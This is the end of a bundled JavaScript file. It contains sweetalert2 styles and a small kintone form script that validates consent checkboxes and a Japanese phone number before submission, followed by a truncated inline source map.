.swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
            }
        });

        // src/apps/examination-management/domain/examination-management-app.ts
        var ExaminationManagementApp;
        ((ExaminationManagementApp2) => {
            ExaminationManagementApp2.screenAddRecord = "/add_record.html";
            ExaminationManagementApp2.allowedScreens = [
                "/add_record.html",
                "/detail_record.html"
            ];
            ExaminationManagementApp2.agreement1 = "\u540C\u610F\u4E8B\u98051";
            ExaminationManagementApp2.agreement2 = "\u540C\u610F\u4E8B\u9805_2";
            ExaminationManagementApp2.phoneNumberId = "\u96FB\u8A71\u756A\u53F7_chobiit\u8868\u793A\u7528";
            ExaminationManagementApp2.listIdFieldUsingSetMaxWidth = [
                "\u7533\u8ACB\u5185\u5BB9_\u30B0\u30EB\u30FC\u30D71",
                "\u7533\u8ACB\u5185\u5BB9_\u30B0\u30EB\u30FC\u30D72",
                "\u7533\u8ACB\u5185\u5BB9_\u30B0\u30EB\u30FC\u30D73"
            ];
            ExaminationManagementApp2.buttonSubmit = "submitBtn";
            ExaminationManagementApp2.buttonEditSubmit = "submitEditBtn";
            ExaminationManagementApp2.clonedButtonSubmit = "clonedSubmitBtn";
            ExaminationManagementApp2.clonedButtonEditSubmit = "clonedSubmitEditBtn";
        })(ExaminationManagementApp || (ExaminationManagementApp = {}));

        // src/apps/examination-management/ui/popup.ts
        var import_sweetalert2 = __toESM(require_sweetalert2_all());
        var Popup = class {
            /**
             *  Show popup error
             * @param messages
             */
            static showPopupError(messages) {
                import_sweetalert2.default.fire({
                    icon: "error",
                    title: "\u30A8\u30E9\u30FC",
                    confirmButtonColor: "#7cd1f9",
                    html: messages
                });
            }
        };

        // src/utils/index.ts
        var getIframeTag = () => {
            const iframeId = document?.getElementById("iframe");
            return iframeId.contentWindow?.document;
        };
        var isValidPhoneNumber = (phoneNumber) => {
            const phonePattern = /^[0-9]{11,12}$/;
            return phonePattern.test(phoneNumber);
        };

        // src/apps/examination-management/infrastructure/examination-management-wrapper.ts
        var ExaminationManagementWrapper = class {
            /**
             * Clone button submit
             */
            cloneButtonSubmit(screen) {
                const submitBtn = document.getElementById(
                    screen === ExaminationManagementApp.screenAddRecord ? ExaminationManagementApp.buttonSubmit : ExaminationManagementApp.buttonEditSubmit
                );
                if (!submitBtn)
                    return;
                const clonedSubmitBtn = submitBtn.cloneNode(true);
                clonedSubmitBtn.id = screen === ExaminationManagementApp.screenAddRecord ? ExaminationManagementApp.clonedButtonSubmit : ExaminationManagementApp.clonedButtonEditSubmit;
                submitBtn.style.display = "none";
                const editMenu = document.getElementById("editMenu");
                if (!editMenu)
                    return;
                editMenu.appendChild(clonedSubmitBtn);
            }
            /**
             * Validate phone number
             */
            validatePhoneNumber(screen) {
                const iframeTag = getIframeTag();
                if (!iframeTag)
                    return;
                const buttonSubmit = document.getElementById(
                    screen === ExaminationManagementApp.screenAddRecord ? ExaminationManagementApp.clonedButtonSubmit : ExaminationManagementApp.clonedButtonEditSubmit
                );
                if (!buttonSubmit)
                    return;
                buttonSubmit.onclick = () => {
                    let errors = "";
                    const agreementElement1 = iframeTag.querySelector(
                        `.field-${ExaminationManagementApp.agreement1} input`
                    );
                    console.log(agreementElement1);
                    if (!agreementElement1)
                        return;
                    const agreementElement2 = iframeTag.querySelector(
                        `.field-${ExaminationManagementApp.agreement2} input`
                    );
                    if (!agreementElement2)
                        return;
                    const phoneNumberElement = iframeTag.querySelector(
                        `.field-${ExaminationManagementApp.phoneNumberId} input`
                    );
                    if (!phoneNumberElement)
                        return;
                    if (!agreementElement1.checked || !agreementElement2.checked || phoneNumberElement.value === "") {
                        errors = "\u5165\u529B\u5185\u5BB9\u304C\u4E0D\u8DB3\u3057\u3066\u304A\u308A\u307E\u3059\u3002";
                    }
                    if (!agreementElement1.checked || !agreementElement2.checked) {
                        errors += "<br>\u30FB\u540C\u610F\u4E8B\u9805";
                    }
                    if (phoneNumberElement.value === "") {
                        errors += "<br>\u30FB\u96FB\u8A71\u756A\u53F7";
                    }
                    if (!errors && phoneNumberElement.value !== "" && !isValidPhoneNumber(phoneNumberElement.value)) {
                        errors = `\u5165\u529B\u3055\u308C\u305F\u96FB\u8A71\u756A\u53F7\u306E\u5F62\u5F0F\u304C\u6B63\u3057\u304F\u3042\u308A\u307E\u305B\u3093\u3002
                <br>- \u534A\u89D2\u6570\u5B57\u3067\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002
                <br>- \u96FB\u8A71\u756A\u53F7\u306F11~12\u6841\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059\u3002
                <br>- \u300C-\u300D\u8A18\u53F7\u306F\u4E0D\u8981\u3067\u3059\u3002`;
                    }
                    if (errors) {
                        Popup.showPopupError(errors);
                        return;
                    }
                    document.getElementById(
                        screen === ExaminationManagementApp.screenAddRecord ? ExaminationManagementApp.buttonSubmit : ExaminationManagementApp.buttonEditSubmit
                    )?.click();
                };
            }
            /**
             * Set max width by specified element
             */
            setMaxWidthBySpecifiedElement() {
                const iframeTag = getIframeTag();
                if (!iframeTag)
                    return;
                ExaminationManagementApp.listIdFieldUsingSetMaxWidth.forEach((idField) => {
                    const fieldsInsideIframe = iframeTag.querySelectorAll(
                        `#${idField} .kintone-field-style`
                    );
                    fieldsInsideIframe.forEach((fieldsInside) => {
                        const field = window.getComputedStyle(fieldsInside);
                        const width = field.getPropertyValue("width");
                        if (width && parseInt(width) > 370) {
                            fieldsInside.style.maxWidth = width;
                            fieldsInside.style.width = "auto";
                        }
                        const divsInsideField = fieldsInside.querySelectorAll("div");
                        divsInsideField.forEach((divsInside) => {
                            const divField = window.getComputedStyle(divsInside);
                            const widthDiv = divField.getPropertyValue("width");
                            if (widthDiv && parseInt(widthDiv) > 350) {
                                divsInside.style.maxWidth = widthDiv;
                                divsInside.style.width = "auto";
                            }
                        });
                    });
                });
            }
        };

        // src/apps/examination-management/application/examination-management-service.ts
        var ExaminationManagementService = class {
            /**
             * Validate specified field
             */
            static validateField(screen) {
                const wrapper = new ExaminationManagementWrapper();
                wrapper.cloneButtonSubmit(screen);
                wrapper.validatePhoneNumber(screen);
            }
            /**
             * Process responsive
             */
            static processResponsive(screen) {
                const wrapper = new ExaminationManagementWrapper();
                wrapper.setMaxWidthBySpecifiedElement();
            }
        };

        // src/errors/system-error.ts
        var import_sweetalert22 = __toESM(require_sweetalert2_all());

        // src/errors/custom-error.ts
        var _CustomError = class extends Error {
            logError() {
                console.error(`An ${this.name} is thrown.`, {
                    message: this.message,
                    stack: this.stack
                });
            }
        };
        var CustomError = _CustomError;
        (() => {
            _CustomError.prototype.name = "CustomError";
        })();

        // src/errors/system-error.ts
        var SystemError = class extends CustomError {
            constructor(error) {
                super(error.message);
                console.error(error.stack);
                this.name = "SystemError";
                this.error = error;
            }
            async showError() {
                await import_sweetalert22.default.fire({
                    icon: "error",
                    title: "\u30B7\u30B9\u30C6\u30E0\u30A8\u30E9\u30FC",
                    html: `\u4E88\u671F\u3057\u306A\u3044\u30A8\u30E9\u30FC\u304C\u767A\u751F\u3057\u307E\u3057\u305F\u3002<br>\u30B7\u30B9\u30C6\u30E0\u7BA1\u7406\u8005\u3078\u9023\u7D61\u3057\u3066\u304F\u3060\u3055\u3044\u3002<br><br>${this.error.message}`
                });
            }
        };

        // src/errors/error-handling.ts
        async function errorHandling(error) {
            if (error instanceof CustomError) {
                await error.showError();
            } else if (error instanceof Error) {
                await new SystemError(error).showError();
            } else {
                await new SystemError(new Error("\u60F3\u5B9A\u3055\u308C\u306A\u3044\u30A8\u30E9\u30FC\u304C\u767A\u751F")).showError();
            }
        }

        // src/apps/examination-management/presentation/record-create-show-handler.ts
        var recordCreateShowHandler = async (screen) => {
            try {
                ExaminationManagementService.validateField(screen);
                ExaminationManagementService.processResponsive(screen);
            } catch (error) {
                await errorHandling(error);
                throw false;
            }
        };

        // src/apps/examination-management/desktop.ts
        if (ExaminationManagementApp.allowedScreens.includes(location.pathname)) {
            recordCreateShowHandler(location.pathname);
        }
    })();
    /*! Bundled license information:

    sweetalert2/dist/sweetalert2.all.js:
      (*!
      * sweetalert2 v11.7.5
      * Released under the MIT License.
      *)
    */
//# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsiLi4vLi4vLi4vLi4vLi4vbm9kZV9tb2R1bGVzL3N3ZWV0YWxlcnQyL2Rpc3Qvc3dlZXRhbGVydDIuYWxsLmpzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9hcHBzL2V4YW1pbmF0aW9uLW1hbmFnZW1lbnQvZG9tYWluL2V4YW1pbmF0aW9uLW1hbmFnZW1lbnQtYXBwLnRzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9hcHBzL2V4YW1pbmF0aW9uLW1hbmFnZW1lbnQvdWkvcG9wdXAudHMiLCAiLi4vLi4vLi4vLi4vLi4vc3JjL3V0aWxzL2luZGV4LnRzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9hcHBzL2V4YW1pbmF0aW9uLW1hbmFnZW1lbnQvaW5mcmFzdHJ1Y3R1cmUvZXhhbWluYXRpb24tbWFuYWdlbWVudC13cmFwcGVyLnRzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9hcHBzL2V4YW1pbmF0aW9uLW1hbmFnZW1lbnQvYXBwbGljYXRpb24vZXhhbWluYXRpb24tbWFuYWdlbWVudC1zZXJ2aWNlLnRzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9lcnJvcnMvc3lzdGVtLWVycm9yLnRzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9lcnJvcnMvY3VzdG9tLWVycm9yLnRzIiwgIi4uLy4uLy4uLy4uLy4uL3NyYy9lcnJvcnMvZXJyb3ItaGFuZGxpbmcudHMiLCAiLi4vLi4vLi4vLi4vLi4vc3JjL2FwcHMvZXhhbWluYXRpb24tbWFuYWdlbWVudC9wcmVzZW50YXRpb24vcmVjb3JkLWNyZWF0ZS1zaG93LWhhbmRsZXIudHMiLCAiLi4vLi4vLi4vLi4vLi4vc3JjL2FwcHMvZXhhbWluYXRpb24tbWFuYWdlbWVudC9kZXNrdG9wLnRzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIvKiFcbiogc3dlZXRhbGVydDIgdjExLjcuNVxuKiBSZWxlYXNlZCB1bmRlciB0aGUgTUlUIExpY2Vuc2UuXG4qL1xuKGZ1bmN0aW9uIChnbG9iYWwsIGZhY3RvcnkpIHtcbiAgdHlwZW9mIGV4cG9ydHMgPT09ICdvYmplY3QnICYmIHR5cGVvZiBtb2R1bGUgIT09ICd1bmRlZmluZWQnID8gbW9kdWxlLmV4cG9ydHMgPSBmYWN0b3J5KCkgOlxuICB0eXBlb2YgZGVmaW5lID09PSAnZnVuY3Rpb24nICYmIGRlZmluZS5hbWQgPyBkZWZpbmUoZmFjdG9yeSkgOlxuICAoZ2xvYmFsID0gdHlwZW9mIGdsb2JhbFRoaXMgIT09ICd1bmRlZmluZWQnID8gZ2xvYmFsVGhpcyA6IGdsb2JhbCB8fCBzZWxmLCBnbG9iYWwuU3dlZXRhbGVydDIgPSBmYWN0b3J5KCkpO1xufSkodGhpcywgKGZ1bmN0aW9uICgpIHsgJ3VzZSBzdHJpY3QnO1xuXG4gIC8qKlxuICAgKiBUaGlzIG1vZHVsZSBjb250YWlucyBgV2Vha01hcGBzIGZvciBlYWNoIGVmZmVjdGl2ZWx5LVwicHJpdmF0ZSAgcHJvcGVydHlcIiB0aGF0IGEgYFN3YWxgIGhhcy5cbiAgICogRm9yIGV4YW1wbGUsIHRvIHNldCB0aGUgcHJpdmF0ZSBwcm9wZXJ0eSBcImZvb1wiIG9mIGB0aGlzYCB0byBcImJhclwiLCB5b3UgY2FuIGBwcml2YXRlUHJvcHMuZm9vLnNldCh0aGlzLCAnYmFyJylgXG4gICAqIFRoaXMgaXMgdGhlIGFwcHJvYWNoIHRoYXQgQmFiZWwgd2lsbCBwcm9iYWJseSB0YWtlIHRvIGltcGxlbWVudCBwcml2YXRlIG1ldGhvZHMvZmllbGRzXG4gICAqICAgaHR0cHM6Ly9naXRodWIuY29tL3RjMzkvcHJvcG9zYWwtcHJpdmF0ZS1tZXRob2RzXG4gICAqICAgaHR0cHM6Ly9naXRodWIuY29tL2JhYmVsL2JhYmVsL3B1bGwvNzU1NVxuICAgKiBPbmNlIHdlIGhhdmUgdGhlIGNoYW5nZXMgZnJvbSB0aGF0IFBSIGluIEJhYmVsLCBhbmQgb3VyIGNvcmUgY2xhc3MgZml0cyByZWFzb25hYmxlIGluICpvbmUgbW9kdWxlKlxuICAgKiAgIHRoZW4gd2UgY2FuIHVzZSB0aGF0IGxhbmd1YWdlIGZlYXR1cmUuXG4gICAqL1xuXG4gIHZhciBwcml2YXRlUHJvcHMgPSB7XG4gICAgYXdhaXRpbmdQcm9taXNlOiBuZXcgV2Vha01hcCgpLFxuICAgIHByb21pc2U6IG5ldyBXZWFrTWFwKCksXG4gICAgaW5uZXJQYXJhbXM6IG5ldyBXZWFrTWFwKCksXG4gICAgZG9tQ2FjaGU6IG5ldyBXZWFrTWFwKClcbiAgfTtcblxuICBjb25zdCBzd2FsUHJlZml4ID0gJ3N3YWwyLSc7XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7c3RyaW5nW119IGl0ZW1zXG4gICAqIEByZXR1cm5zIHtvYmplY3R9XG4gICAqL1xuICBjb25zdCBwcmVmaXggPSBpdGVtcyA9PiB7XG4gICAgY29uc3QgcmVzdWx0ID0ge307XG4gICAgZm9yIChjb25zdCBpIGluIGl0ZW1zKSB7XG4gICAgICByZXN1bHRbaXRlbXNbaV1dID0gc3dhbFByZWZpeCArIGl0ZW1zW2ldO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xuICB9O1xuICBjb25zdCBzd2FsQ2xhc3NlcyA9IHByZWZpeChbJ2NvbnRhaW5lcicsICdzaG93bicsICdoZWlnaHQtYXV0bycsICdpb3NmaXgnLCAncG9wdXAnLCAnbW9kYWwnLCAnbm8tYmFja2Ryb3AnLCAnbm8tdHJhbnNpdGlvbicsICd0b2FzdCcsICd0b2FzdC1zaG93bicsICdzaG93JywgJ2hpZGUnLCAnY2xvc2UnLCAndGl0bGUnLCAnaHRtbC1jb250YWluZXInLCAnYWN0aW9ucycsICdjb25maXJtJywgJ2RlbnknLCAnY2FuY2VsJywgJ2RlZmF1bHQtb3V0bGluZScsICdmb290ZXInLCAnaWNvbicsICdpY29uLWNvbnRlbnQnLCAnaW1hZ2UnLCAnaW5wdXQnLCAnZmlsZScsICdyYW5nZScsICdzZWxlY3QnLCAncmFkaW8nLCAnY2hlY2tib3gnLCAnbGFiZWwnLCAndGV4dGFyZWEnLCAnaW5wdXRlcnJvcicsICdpbnB1dC1sYWJlbCcsICd2YWxpZGF0aW9uLW1lc3NhZ2UnLCAncHJvZ3Jlc3Mtc3RlcHMnLCAnYWN0aXZlLXByb2dyZXNzLXN0ZXAnLCAncHJvZ3Jlc3Mtc3RlcCcsICdwcm9ncmVzcy1zdGVwLWxpbmUnLCAnbG9hZGVyJywgJ2xvYWRpbmcnLCAnc3R5bGVkJywgJ3RvcCcsICd0b3Atc3RhcnQnLCAndG9wLWVuZCcsICd0b3AtbGVmdCcsICd0b3AtcmlnaHQnLCAnY2VudGVyJywgJ2NlbnRlci1zdGFydCcsICdjZW50ZXItZW5kJywgJ2NlbnRlci1sZWZ0JywgJ2NlbnRlci1yaWdodCcsICdib3R0b20nLCAnYm90dG9tLXN0YXJ0JywgJ2JvdHRvbS1lbmQnLCAnYm90dG9tLWxlZnQnLCAnYm90dG9tLXJpZ2h0JywgJ2dyb3ctcm93JywgJ2dyb3ctY29sdW1uJywgJ2dyb3ctZnVsbHNjcmVlbicsICdydGwnLCAndGltZXItcHJvZ3Jlc3MtYmFyJywgJ3RpbWVyLXByb2dyZXNzLWJhci1jb250YWluZXInLCAnc2Nyb2xsYmFyLW1lYXN1cmUnLCAnaWNvbi1zdWNjZXNzJywgJ2ljb24td2FybmluZycsICdpY29uLWluZm8nLCAnaWNvbi1xdWVzdGlvbicsICdpY29uLWVycm9yJ10pO1xuICBjb25zdCBpY29uVHlwZXMgPSB